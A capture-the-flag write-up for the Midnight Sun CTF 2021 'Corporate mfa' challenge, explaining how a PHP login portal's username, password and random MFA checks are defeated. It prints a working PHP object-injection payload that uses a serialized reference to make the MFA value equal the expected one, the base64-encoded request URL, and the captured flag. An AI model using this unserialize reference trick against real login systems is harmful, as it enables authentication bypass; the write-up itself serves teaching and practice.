# Midnight Sun CTF 2021 "Corporate mfa" writeup

## Challenge

The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code.
settings Service: http://corpmfa-01.play.midnightsunctf.se

## Solution

We need to break through the `verify()` function.

```php
	public function verify()
	{
		if (!$this->verifyUsername())
			throw new InvalidArgumentException('Invalid username');

		if (!$this->verifyPassword())
			throw new InvalidArgumentException('Invalid password');

		if (!$this->verifyMFA())
			throw new InvalidArgumentException('Invalid MFA token value');

		return true;
	}
```

First, `verifyUsername()` is a simple string comparison.

```php
	private function verifyUsername()
	{
		return $this->userData->username === 'D0loresH4ze';
	}
```

Second, `verifyPassword()` is a password inspection using bcrypt.

```php
	private function verifyPassword()
	{
		return password_verify($this->userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
	}
```

This hash is well known in [PHP manual](https://www.php.net/manual/en/function.password-verify.php).

The password is `rasmuslerdorf`.

And finally, `verifyMFA()` is inspection of a number that is 10 digit random number.

```php
	private function verifyMFA()
	{
		$this->userData->_correctValue = random_int(1e10, 1e11 - 1);
		return (int)$this->userData->mfa === $this->userData->_correctValue;
	}
```

This is very difficult to break through. However, the variable `mfa` is created by unserializing user requests.

So, it is possible to determine that `mfa` and `_correctValue` match by using `mfa` as the reference of `_correctValue` by object injection.

Answer is

```
O:8:"stdClass":4:{s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:13:"_correctValue";N;s:3:"mfa";R:4;}
```

And create userdata parameter by base64 encoding.

<http://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo4OiJzdGRDbGFzcyI6NDp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MTM6Il9jb3JyZWN0VmFsdWUiO047czozOiJtZmEiO1I6NDt9>

I got flag.

```
midnight{395E160F-4DB8-4D7A-99EF-08E6799741B5}
```
